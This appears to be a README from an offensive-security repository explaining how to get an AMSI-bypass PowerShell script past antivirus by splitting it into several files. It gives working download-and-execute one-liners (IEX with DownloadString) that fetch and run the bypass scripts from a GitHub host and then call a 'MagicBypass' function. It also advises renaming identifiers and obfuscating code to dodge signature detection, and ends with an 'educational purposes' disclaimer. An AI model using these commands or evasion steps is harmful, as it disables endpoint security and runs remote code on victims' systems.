## Simple AV Bypass Trick: Splitting the Original `POC.ps1` Script

If you try to execute the original `POC.ps1` script using `DownloadString`, it will likely get blocked by antivirus (AV). This happens because the script has been signatured in AV databases after being public for a while. However, the **technique itself is still valid**.

For example, the following command will be blocked by AV:

```powershell
IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/POC.ps1")
```

## Why This Happens
Antivirus tools flag scripts like POC.ps1 because their content or behavior matches known signatures in their database. Once a script is identified as malicious, the signature is updated, causing AV tools to block it.

## How Attackers Bypass This

Attackers can still leverage the same technique and bypass AV by avoiding signature-based detection. Here’s how they do it:

- Split the Original Script
They split the script into multiple smaller files (e.g., hello1.ps1, hello2.ps1, and hello3.ps1) and then call them sequentially in a single command:

```powershell
IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello2.ps1"); IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/refs/heads/main/AvBypassTricks/hello3.ps1"); MagicBypass;

```

- Modify Variables and Functions
They rename variables, functions, and other identifiers in the script to prevent pattern-matching detection.

- Obfuscate the Code
They obfuscate the code further by encoding strings, breaking lines, or adding unnecessary characters and operations. This makes it harder for AV tools to recognize malicious intent.

## Effectiveness
In practice, splitting the script and applying even minimal obfuscation is often sufficient to evade AV detection. However, modern AV solutions with advanced behavioral analysis may still detect such techniques so the combinations of all 3 techniques can be quite powerfull.


**Disclaimer: This information is shared for educational purposes only to help understand security measures and how to better protect against such attacks.**
